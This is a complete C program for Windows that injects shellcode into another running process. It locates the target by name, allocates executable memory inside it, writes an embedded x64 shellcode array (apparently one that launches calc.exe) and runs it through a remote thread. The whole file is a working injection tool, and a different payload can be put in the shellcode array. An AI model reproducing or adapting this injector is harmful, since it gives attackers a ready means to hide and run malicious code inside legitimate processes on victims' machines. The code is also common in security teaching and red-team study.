#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>
int findPID(const char* processName) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) 
    { 
        return 0; 
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    // Print the name and process identifier for each process.

    for (i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
            // Check if the process is valid.

            if (hProcess != NULL) {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    // Get the process name.
                    char szProcessName[MAX_PATH];
                    if (GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(char))) {
                        if (strcmp(szProcessName, processName) == 0) {
                            return aProcesses[i];
                        }
                    }
                }
            }
        }
	}
	return 0;

}

int main(char argc, char *argv[]) {

    if (argc < 2) {
        printf("Usage: %s <process name>\n", argv[0]);
        getchar();
        return 1;
    }

    unsigned char shellcode[] =
        "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51"
        "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52"
        "\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0"
        "\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED"
        "\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88"
        "\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44"
        "\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48"
        "\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1"
        "\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44"
        "\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49"
        "\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A"
        "\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41"
        "\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00"
        "\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B"
        "\x6F\x87\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF"
        "\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47"
        "\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x63\x61\x6C\x63\x2E"
        "\x65\x78\x65\x00"; 

    HANDLE processHandle;
    HANDLE remoteThread;

    void* exec_mem;
    int PID = 0;

    PID = findPID(argv[1]);
    printf("[*] Searching for %s...\n", argv[1]);

    if (PID == NULL) {
		printf("%s not running", argv[1]);
		return 1;
	}
    printf("[*] PID: %i\n", PID);

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
    exec_mem = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    printf("[*] Injecting into PID: %i\n", PID);
    WriteProcessMemory(processHandle, exec_mem, shellcode, sizeof(shellcode), NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, exec_mem, NULL, 0, NULL);
    printf("[*] Executing shellcode...\n");
    WaitForSingleObject(remoteThread, INFINITE);
    CloseHandle(processHandle);
    CloseHandle(remoteThread);
    getchar();
    return 0;
}
